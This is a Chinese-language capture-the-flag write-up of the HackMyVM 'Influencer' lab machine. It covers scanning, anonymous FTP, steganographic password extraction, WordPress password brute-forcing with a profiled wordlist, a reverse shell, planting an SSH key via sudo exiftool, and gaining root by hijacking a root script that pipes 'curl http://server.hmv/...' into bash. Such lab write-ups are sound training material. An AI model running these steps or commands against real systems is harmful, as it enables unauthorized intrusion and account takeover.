---
title: Influencer
author: hgbe02
date: 2024-04-28
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Influencer.html"
---

# Influencer

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404282037343.png" alt="image-20240428124106064" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404282037344.png" alt="image-20240428185102757" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
┌──(kali💀kali)-[~/temp/Influencer]
└─$ rustscan -a 192.168.0.139 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.0.139:80
Open 192.168.0.139:2121

PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
2121/tcp open  ftp     syn-ack vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.0.143
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0           11113 Jun 09  2023 facebook.jpg
| -rw-r--r--    1 0        0           35427 Jun 09  2023 github.jpg
| -rw-r--r--    1 0        0           88816 Jun 09  2023 instagram.jpg
| -rw-r--r--    1 0        0           27159 Jun 09  2023 linkedin.jpg
| -rw-r--r--    1 0        0              28 Jun 08  2023 note.txt
|_-rw-r--r--    1 0        0          124263 Jun 09  2023 snapchat.jpg
```

### 目录扫描

```bash
┌──(kali💀kali)-[~/temp/Influencer]
└─$ gobuster dir -u http://192.168.0.139/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,bak,jpg,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.139/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,zip,bak,jpg,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10671]
/.php                 (Status: 403) [Size: 278]
/wordpress            (Status: 301) [Size: 318] [--> http://192.168.0.139/wordpress/]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 1543920 / 1543927 (100.00%)
===============================================================
Finished
===============================================================
```

## 漏洞发现

### 踩点

```bash
┌──(kali💀kali)-[~/temp/Influencer]
└─$ curl http://192.168.0.139 | html2text
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 10671  100 10671    0     0  4249k      0 --:--:-- --:--:-- --:--:-- 5210k
[Ubuntu Logo]
 Apache2 Default Page
It works!
This is the default welcome page used to test the correct operation of the
Apache2 server after installation on Ubuntu systems. It is based on the
equivalent page on Debian, from which the Ubuntu Apache packaging is derived.
If you can read this page, it means that the Apache HTTP server installed at
this site is working properly. You should replace this file (located at /var/
www/html/index.html) before continuing to operate your HTTP server.
If you are a normal user of this web site and don't know what this page is
about, this probably means that the site is currently unavailable due to
maintenance. If the problem persists, please contact the site's administrator.
Configuration Overview
Ubuntu's Apache2 default configuration is different from the upstream default
configuration, and split into several files optimized for interaction with
Ubuntu tools. The configuration system is fully documented in /usr/share/doc/
apache2/README.Debian.gz. Refer to this for the full documentation.
Documentation for the web server itself can be found by accessing the manual if
the apache2-doc package was installed on this server.
The configuration layout for an Apache2 web server installation on Ubuntu
systems is as follows:
/etc/apache2/
```

就是普通界面，尝试进行进一步的探索。

### 敏感端口服务

匿名进行登录。

```bash
┌──(kali💀kali)-[~/temp/Influencer]
└─$ ftp 192.168.0.139 2121                
Connected to 192.168.0.139.
220 (vsFTPd 3.0.5)
Name (192.168.0.139:kali): ftp
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||16523|)
150 Here comes the directory listing.
dr-xr-xr-x    2 1000     65534        4096 Jun 09  2023 .
dr-xr-xr-x    2 1000     65534        4096 Jun 09  2023 ..
-rw-r--r--    1 0        0           11113 Jun 09  2023 facebook.jpg
-rw-r--r--    1 0        0           35427 Jun 09  2023 github.jpg
-rw-r--r--    1 0        0           88816 Jun 09  2023 instagram.jpg
-rw-r--r--    1 0        0           27159 Jun 09  2023 linkedin.jpg
-rw-r--r--    1 0        0              28 Jun 08  2023 note.txt
-rw-r--r--    1 0        0          124263 Jun 09  2023 snapchat.jpg
226 Directory send OK.
ftp> mget *.*
mget facebook.jpg [anpqy?]? 
229 Entering Extended Passive Mode (|||26191|)
150 Opening BINARY mode data connection for facebook.jpg (11113 bytes).
100% |***********************************************************************************************************| 11113      634.68 KiB/s    00:00 ETA
226 Transfer complete.
11113 bytes received in 00:00 (618.66 KiB/s)
mget github.jpg [anpqy?]? 
229 Entering Extended Passive Mode (|||15369|)
150 Opening BINARY mode data connection for github.jpg (35427 bytes).
100% |***********************************************************************************************************| 35427       39.28 MiB/s    00:00 ETA
226 Transfer complete.
35427 bytes received in 00:00 (28.90 MiB/s)
mget instagram.jpg [anpqy?]? 
229 Entering Extended Passive Mode (|||56348|)
150 Opening BINARY mode data connection for instagram.jpg (88816 bytes).
100% |***********************************************************************************************************| 88816        2.38 MiB/s    00:00 ETA
226 Transfer complete.
88816 bytes received in 00:00 (2.35 MiB/s)
mget linkedin.jpg [anpqy?]? 
229 Entering Extended Passive Mode (|||16758|)
150 Opening BINARY mode data connection for linkedin.jpg (27159 bytes).
100% |***********************************************************************************************************| 27159        1.40 MiB/s    00:00 ETA
226 Transfer complete.
27159 bytes received in 00:00 (1.37 MiB/s)
mget note.txt [anpqy?]? 
229 Entering Extended Passive Mode (|||22962|)
150 Opening BINARY mode data connection for note.txt (28 bytes).
100% |***********************************************************************************************************|    28        0.94 KiB/s    00:00 ETA
226 Transfer complete.
28 bytes received in 00:00 (0.92 KiB/s)
mget snapchat.jpg [anpqy?]? 
229 Entering Extended Passive Mode (|||8797|)
150 Opening BINARY mode data connection for snapchat.jpg (124263 bytes).
100% |***********************************************************************************************************|   121 KiB    2.44 MiB/s    00:00 ETA
226 Transfer complete.
124263 bytes received in 00:00 (2.42 MiB/s)
ftp> exit
221 Goodbye.
```

然后查看一些是否隐藏了东西：

```bash
┌──(kali💀kali)-[~/temp/Influencer]
└─$ ls -la
total 300
drwxr-xr-x  2 kali kali   4096 Apr 28 06:55 .
drwxr-xr-x 81 kali kali   4096 Apr 28 06:48 ..
-rw-r--r--  1 kali kali  11113 Jun  9  2023 facebook.jpg
-rw-r--r--  1 kali kali  35427 Jun  9  2023 github.jpg
-rw-r--r--  1 kali kali  88816 Jun  9  2023 instagram.jpg
-rw-r--r--  1 kali kali  27159 Jun  9  2023 linkedin.jpg
-rw-r--r--  1 kali kali     28 Jun  8  2023 note.txt
-rw-r--r--  1 kali kali 124263 Jun  9  2023 snapchat.jpg

┌──(kali💀kali)-[~/temp/Influencer]
└─$ cat note.txt 
- Change wordpress password

........
try and try
........

┌──(kali💀kali)-[~/temp/Influencer]
└─$ stegseek -wl /usr/share/wordlists/rockyou.txt snapchat.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "backup.txt".
[i] Extracting to "snapchat.jpg.out".

┌──(kali💀kali)-[~/temp/Influencer]
└─$ cat snapchat.jpg.out 
PASSWORD BACKUP
---------------

u3jkeg97gf
```

所以尝试要从最后开始尝试！

### blog目录

发现了一个`wordpress`目录，查看一下：

```bash
┌──(kali💀kali)-[~/temp/Influencer]
└─$ curl http://192.168.0.139/wordpress/ -s | html2text | uniq

Skip_to_content

***** Breaking *****
Â¡Hello_world!
****** My_new_blog! ******

****** My_new_blog! ******

    * Home
   ⁰

Test
*** Â¡Hello_world! ***
luna
  Jun_8,_2023  1_Comments
My name is Luna Shine, and I am thrilled to share my passion for fashion with
all of you. Born on June 24, 1997, I have dedicated my life to…

Search
[Unknown INPUT type]Search
***** Entradas recientes *****
    * Â¡Hello_world!
***** Comentarios recientes *****
   1. Admin on Â¡Hello_world!
***** Archivos *****
    * June_2023
***** CategorÃ­as *****
    * Test

***** You Missed *****
>
Test
*** Â¡Hello_world! ***

My_new_blog!
Copyright © All rights reserved  |  BlogArise by Themeansar.

 Search for: [Unknown INPUT type]  [Search]
```

得到用户`Luna Shine`，生日`6,24,1997`扫描一下：

```bash
┌──(kali💀kali)-[~/temp/Influencer]
└─$ whatweb http://192.168.0.139/wordpress/                
http://192.168.0.139/wordpress/ [200 OK] Apache[2.4.52], Bootstrap[6.5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.0.139], JQuery[3.7.1], MetaGenerator[WordPress 6.5.2], Script[text/javascript], Title[My new blog!], UncommonHeaders[link], WordPress[6.5.2]
```

看来没差了，进行`wpscan`扫描：

#### 用户扫描

```bash
wpscan --url http://192.168.0.139/wordpress/ -e u --api-token xxxxxxxx
```

```bash
[i] User(s) Identified:

[+] luna
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.0.139/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

#### 插件扫描

```bash
wpscan --url http://192.168.0.139/wordpress/ -e p --api-token xxxxxxxx
```

```text
[+] Enumerating Most Popular Plugins (via Passive Methods)

[i] No plugins Found.
```

没有插件欸。。。。

#### sql注入

先抓个包：

```bash
POST /wordpress/wp-login.php HTTP/1.1
Host: 192.168.0.139
Content-Length: 117
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.0.139
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.0.139/wordpress/wp-login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: wordpress_test_cookie=WP%20Cookie%20check; PHPSESSID=0epcnghs4sn67tv9sao8bni1li
Connection: close

log=admin&pwd=password&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.0.139%2Fwordpress%2Fwp-admin%2F&testcookie=1
```

尝试注入，但是：

```text
[CRITICAL] all tested parameters do not appear to be injectable.
```

。。。。。

#### 继续尝试

尝试一下之前找到的密码`u3jkeg97gf`但是失败了，尝试进行定义字典爆破：

```bash
┌──(kali💀kali)-[~/cupp]
└─$ python3 cupp.py -i 
 ___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: luna
> Surname: shine
> Nickname: 
> Birthdate (DDMMYYYY): 24061997


> Partners) name: 
> Partners) nickname: 
> Partners) birthdate (DDMMYYYY): 


> Child's name: 
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 


> Pet's name: 
> Company name: 


> Do you want to add some key words about the victim? Y/[N]: 
> Do you want to add special chars at the end of words? Y/[N]: 
> Do you want to add some random numbers at the end of words? Y/[N]:
> Leet mode? (i.e. leet = 1337) Y/[N]: 

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to luna.txt, counting 2778 words.
> Hyperspeed Print? (Y/n) : n
[+] Now load your pistolero with luna.txt and shoot! Good luck!
```

尝试进行爆破：

```
┌──(kali💀kali)-[~/temp/Influencer]
└─$ wpscan --url http://192.168.0.139/wordpress/ -e u -P /home/kali/cupp/luna.txt --api-token xxxxxxx
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
[i] User(s) Identified:

[+] luna
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.0.139/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - luna / luna_1997                                                                                                                            
Trying luna / luna_1997 Time: 00:00:38 <=================================                                          > (2280 / 5058) 45.07%  ETA: ??:??:??
[!] Valid Combinations Found:
 | Username: luna, Password: luna_1997
```

### 上传反弹shell

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404282037345.png" alt="image-20240428195122047" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404282037346.png" alt="image-20240428195224927" style="zoom:50%;" />

尝试写入：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404282037347.png" alt="image-20240428195425991" style="zoom:50%;" />

尝试随便输入一个目录，触发反弹shell，但是无法进行触发，换一个可以访问的进行触发：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404282037348.png" alt="image-20240428200224464" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404282037350.png" alt="image-20240428200239640" style="zoom:50%;" />

## 提权

### 信息搜集

```bash
(remote) www-data@influencer:/$ sudo -l
[sudo] password for www-data: 
sudo: a password is required
(remote) www-data@influencer:/$ ls -la
total 2097228
drwxr-xr-x  19 root root       4096 Jun  8  2023 .
drwxr-xr-x  19 root root       4096 Jun  8  2023 ..
lrwxrwxrwx   1 root root          7 Feb 17  2023 bin -> usr/bin
drwxr-xr-x   4 root root       4096 Jun  8  2023 boot
drwxr-xr-x  20 root root       4080 Apr 28 10:49 dev
drwxr-xr-x 101 root root       4096 Jun 10  2023 etc
drwxr-xr-x   4 root root       4096 Jun  8  2023 home
lrwxrwxrwx   1 root root          7 Feb 17  2023 lib -> usr/lib
lrwxrwxrwx   1 root root          9 Feb 17  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root root          9 Feb 17  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root root         10 Feb 17  2023 libx32 -> usr/libx32
drwx------   2 root root      16384 Jun  8  2023 lost+found
drwxr-xr-x   2 root root       4096 Feb 17  2023 media
drwxr-xr-x   2 root root       4096 Feb 17  2023 mnt
drwxr-xr-x   2 root root       4096 Feb 17  2023 opt
dr-xr-xr-x 176 root root          0 Apr 28 10:49 proc
drwx------   6 root root       4096 Jun 10  2023 root
drwxr-xr-x  32 root root        900 Apr 28 11:25 run
lrwxrwxrwx   1 root root          8 Feb 17  2023 sbin -> usr/sbin
drwxr-xr-x   6 root root       4096 Feb 17  2023 snap
drwxr-xr-x   3 root root       4096 Jun  8  2023 srv
-rw-------   1 root root 2147483648 Jun  8  2023 swap.img
dr-xr-xr-x  13 root root          0 Apr 28 10:49 sys
drwxrwxrwt   2 root root       4096 Apr 28 11:02 tmp
drwxr-xr-x  14 root root       4096 Feb 17  2023 usr
drwxr-xr-x  14 root root       4096 Jun  8  2023 var
(remote) www-data@influencer:/$ cat /etc/passwd | grep 'sh'
root:x:0:0:root:/root:/bin/bash
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
luna:x:1000:1000:Luna Shine:/home/luna:/bin/bash
juan:x:1001:1001:juan,,,:/home/juan:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
(remote) www-data@influencer:/$ cd /home
(remote) www-data@influencer:/home$ ls -la
total 16
drwxr-xr-x  4 root root 4096 Jun  8  2023 .
drwxr-xr-x 19 root root 4096 Jun  8  2023 ..
drwx------  2 juan juan 4096 Jun  9  2023 juan
drwx------  4 luna luna 4096 Jun  9  2023 luna
(remote) www-data@influencer:/home$ cd juan
bash: cd: juan: Permission denied
(remote) www-data@influencer:/home$ cd luna/
bash: cd: luna/: Permission denied
(remote) www-data@influencer:/home$ find / -perm -u=s -type f 2>/dev/null
/usr/libexec/polkit-agent-helper-1
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/fusermount3
/usr/bin/mount
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/snap/snapd/18357/usr/lib/snapd/snap-confine
/snap/snapd/19361/usr/lib/snapd/snap-confine
/snap/core20/1891/usr/bin/chfn
/snap/core20/1891/usr/bin/chsh
/snap/core20/1891/usr/bin/gpasswd
/snap/core20/1891/usr/bin/mount
/snap/core20/1891/usr/bin/newgrp
/snap/core20/1891/usr/bin/passwd
/snap/core20/1891/usr/bin/su
/snap/core20/1891/usr/bin/sudo
/snap/core20/1891/usr/bin/umount
/snap/core20/1891/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1891/usr/lib/openssh/ssh-keysign
/snap/core20/1822/usr/bin/chfn
/snap/core20/1822/usr/bin/chsh
/snap/core20/1822/usr/bin/gpasswd
/snap/core20/1822/usr/bin/mount
/snap/core20/1822/usr/bin/newgrp
/snap/core20/1822/usr/bin/passwd
/snap/core20/1822/usr/bin/su
/snap/core20/1822/usr/bin/sudo
/snap/core20/1822/usr/bin/umount
/snap/core20/1822/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1822/usr/lib/openssh/ssh-keysign
(remote) www-data@influencer:/home$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/snap/core20/1891/usr/bin/ping cap_net_raw=ep
/snap/core20/1822/usr/bin/ping cap_net_raw=ep
(remote) www-data@influencer:/home$ ss -atlp
State            Recv-Q           Send-Q                       Local Address:Port                         Peer Address:Port           Process           
LISTEN           0                4096                         127.0.0.53%lo:domain                            0.0.0.0:*                                
LISTEN           0                128                              127.0.0.1:1212                              0.0.0.0:*                                
LISTEN           0                32                                 0.0.0.0:iprop                             0.0.0.0:*                                
LISTEN           0                80                               127.0.0.1:mysql                             0.0.0.0:*                                
LISTEN           0                511                                      *:http                                    *:*                                
(remote) www-data@influencer:/home$ nc 0.0.0.0 1212
SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
^C
```

### 切换luna提权juan

尝试进行切换，看看密码是否进行了复用：

```bash
luna_1997
u3jkeg97gf
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404282037351.png" alt="image-20240428200926934" style="zoom: 50%;" />

```bash
luna@influencer:~$ sudo -l
Matching Defaults entries for luna on influencer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User luna may run the following commands on influencer:
    (juan) NOPASSWD: /usr/bin/exiftool
```

https://gtfobins.github.io/gtfobins/exiftool/#sudo

尝试进行读写`juan`的`ssh私钥`：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404282037352.png" alt="image-20240428201451831" style="zoom: 50%;" />

```bash
luna@influencer:~$ cd /tmp
luna@influencer:/tmp$ touch id_rsa
luna@influencer:/tmp$ sudo /usr/bin/exiftool id_rsa /home/juan/.ssh/id_rsa
[sudo] password for luna: 
sudo: a password is required
luna@influencer:/tmp$ sudo -u juan /usr/bin/exiftool id_rsa /home/juan/.ssh/id_rsa
======== id_rsa
ExifTool Version Number         : 12.40
File Name                       : id_rsa
Directory                       : .
File Size                       : 0 bytes
File Modification Date/Time     : 2024:04:28 12:15:57+00:00
File Access Date/Time           : 2024:04:28 12:15:57+00:00
File Inode Change Date/Time     : 2024:04:28 12:15:57+00:00
File Permissions                : -rw-rw-r--
Error                           : File is empty
Error: File not found - /home/juan/.ssh/id_rsa
    1 image files read
    1 files could not be read
```

额，不存在，尝试添加一个进去，先本地生成一对密钥对。

```bash
┌──(kali💀kali)-[~/temp/Influencer]
└─$ ssh-keygen -t rsa -f /home/kali/temp/Influencer/juan
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/temp/Influencer/juan
Your public key has been saved in /home/kali/temp/Influencer/juan.pub
The key fingerprint is:
SHA256:/xMR+gJtJQiy8EhEtszHXYSkcsG5nJDhuiNWojzpqTk kali@kali
The key's randomart image is:
+---[RSA 3072]----+
| oB+ooo+o.       |
| *o*o*... . o    |
|  BoBo.  . + .   |
| . ++   . + .    |
|.. .    So . .   |
|o.+      .. o    |
|==        .. .   |
|Eoo        ..    |
|++          ..   |
+----[SHA256]-----+

┌──(kali💀kali)-[~/temp/Influencer]
└─$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
192.168.0.139 - - [28/Apr/2024 08:22:18] "GET /juan HTTP/1.1" 200 -
192.168.0.139 - - [28/Apr/2024 08:22:22] "GET /juan.pub HTTP/1.1" 200 -
```

尝试进行提权`juan`用户：

```bash
luna@influencer:/tmp$ wget http://192.168.0.143:8888/juan
--2024-04-28 12:22:19--  http://192.168.0.143:8888/juan
Connecting to 192.168.0.143:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2590 (2,5K) [application/octet-stream]
Saving to: ‘juan’

juan                                  100%[=========================================================================>]   2,53K  --.-KB/s    in 0s      

2024-04-28 12:22:19 (276 MB/s) - ‘juan’ saved [2590/2590]

luna@influencer:/tmp$ wget http://192.168.0.143:8888/juan.pub
--2024-04-28 12:22:23--  http://192.168.0.143:8888/juan.pub
Connecting to 192.168.0.143:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 563 [application/vnd.exstream-package]
Saving to: ‘juan.pub’

juan.pub                              100%[=========================================================================>]     563  --.-KB/s    in 0s      

2024-04-28 12:22:23 (107 MB/s) - ‘juan.pub’ saved [563/563]

luna@influencer:/tmp$ mv juan.pub authorized_keys
luna@influencer:/tmp$ sudo -u juan exiftool -filename=/home/juan/.ssh/authorized_keys authorized_keys 
Warning: Error removing old file - authorized_keys
    1 directories created
    1 image files updated
luna@influencer:/tmp$ sudo -u juan exiftool -filename=/home/juan/.ssh/authorized_keys authorized_keys 
Error: '/home/juan/.ssh/authorized_keys' already exists - authorized_keys
    0 image files updated
    1 files weren't updated due to errors
luna@influencer:/tmp$ chmod 600 juan
luna@influencer:/tmp$ ssh juan@0.0.0.0 -p 1212 -i juan
The authenticity of host '[0.0.0.0]:1212 ([0.0.0.0]:1212)' can't be established.
ED25519 key fingerprint is SHA256:uujkDI7HQ0Bk3td/3NfWys9FNY5cbT1zvGvXbluerAk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[0.0.0.0]:1212' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-73-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of dom 28 abr 2024 12:25:44 UTC

  System load:  0.0                Processes:               128
  Usage of /:   55.9% of 11.21GB   Users logged in:         1
  Memory usage: 45%                IPv4 address for enp0s3: 192.168.0.139
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

El mantenimiento de seguridad expandido para Applications está desactivado

Se pueden aplicar 0 actualizaciones de forma inmediata.

Active ESM Apps para recibir futuras actualizaciones de seguridad adicionales.
Vea https://ubuntu.com/esm o ejecute «sudo pro status»


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

juan@influencer:~$ 
```

### 提权root

第一步还是信息搜集：

```bash
juan@influencer:~$ sudo -l
Matching Defaults entries for juan on influencer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User juan may run the following commands on influencer:
    (root) NOPASSWD: /bin/bash /home/juan/check.sh
juan@influencer:~$ cat /home/juan/check.sh
#!/bin/bash


/usr/bin/curl http://server.hmv/98127651 | /bin/bash
```

又是arp欺骗：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404282037353.png" alt="image-20240428203227656" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404282037354.png" alt="image-20240428203243419" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404282037355.png" alt="image-20240428203257401" style="zoom:50%;" />

他居然自己可写，而且自带了解析，我说咋不行。。。但是搞都搞了，把他自带的解析删掉就行了吧：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404282037356.png" alt="image-20240428203609447" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404282037357.png" alt="image-20240428203619852" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404282037358.png" alt="image-20240428203632120" style="zoom:50%;" />

拿下rootshell了！！！！！

## 参考

https://www.bilibili.com/video/BV1AC411j7Zj/

https://0xh3rshel.github.io/hmv-influencer/